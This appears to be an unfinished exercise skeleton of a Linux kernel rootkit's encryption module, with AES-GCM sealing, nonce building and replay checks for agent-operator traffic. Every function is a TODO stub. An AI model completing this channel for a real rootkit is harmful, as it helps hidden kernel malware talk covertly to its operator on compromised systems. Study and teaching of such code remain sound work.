// SPDX-License-Identifier: GPL-2.0
//
// AEAD envelope: GCM(AES) seal, open, and nonce construction.
//
// Every message between agent and operator is encrypted with a unique
// nonce derived from (session_id, direction, sequence). Replay
// protection comes from monotonically increasing sequence numbers.
//
#include <crypto/aead.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>

#include "rootkit.h"

static void build_nonce(u8 *nonce, u64 session_id, u8 direction, u64 seq)
{
	// TODO: Build 12-byte nonce:
	// bytes 0-7: session_id as big-endian
	// byte 8: direction
	// bytes 9-11: low 24 bits of seq
}

static int aead_seal(struct crypto_aead *tfm, const u8 *nonce,
		     const u8 *aad, size_t aad_len,
		     const u8 *plaintext, size_t pt_len,
		     u8 *out, size_t *out_len)
{
	// TODO:
	// 1. kmalloc buf of aad_len + pt_len + RK_TAG_LEN
	// 2. Copy aad then plaintext into buf
	// 3. sg_init_one over entire buf
	// 4. aead_request_alloc, set_crypt (pt_len), set_ad (aad_len)
	// 5. crypto_aead_encrypt
	// 6. Copy result to out, set *out_len
	// 7. Free request and buf
	return -ENOSYS;
}

static int aead_open(struct crypto_aead *tfm, const u8 *nonce,
		     const u8 *aad, size_t aad_len,
		     const u8 *ct_with_aad, size_t total_len,
		     u8 *out, size_t *out_len)
{
	// TODO:
	// 1. Validate total_len >= aad_len + RK_TAG_LEN
	// 2. ct_plus_tag = total_len - aad_len
	// 3. kmalloc buf, copy ct_with_aad
	// 4. sg_init_one, aead_request_alloc
	// 5. set_crypt (ct_plus_tag), set_ad (aad_len)
	// 6. crypto_aead_decrypt
	// 7. *out_len = ct_plus_tag - RK_TAG_LEN
	// 8. Copy plaintext from buf + aad_len to out
	return -ENOSYS;
}

int rk_send_sealed(struct rk_session *s, const u8 *data, size_t len)
{
	// TODO:
	// 1. Build envelope header (version=1, direction=RK_DIR_AGENT,
	//    session_id and sequence in network byte order)
	// 2. build_nonce with session_id, RK_DIR_AGENT, tx_seq
	// 3. aead_seal with header as AAD, data as plaintext
	// 4. rk_send_frame the sealed bytes
	// 5. Increment tx_seq on success
	return -ENOSYS;
}

int rk_recv_sealed(struct rk_session *s, u8 *out, size_t max_len,
		   size_t *out_len)
{
	// TODO:
	// 1. kmalloc frame buffer (RK_FRAME_MAX)
	// 2. rk_recv_frame into it
	// 3. Validate frame_len >= RK_HDR_LEN + RK_TAG_LEN
	// 4. Extract header, get sequence number
	// 5. Replay check: seq < rx_seq_expected -> -EPROTO
	// 6. build_nonce from header fields
	// 7. aead_open with header as AAD
	// 8. Check *out_len <= max_len
	// 9. Update rx_seq_expected = seq + 1
	return -ENOSYS;
}
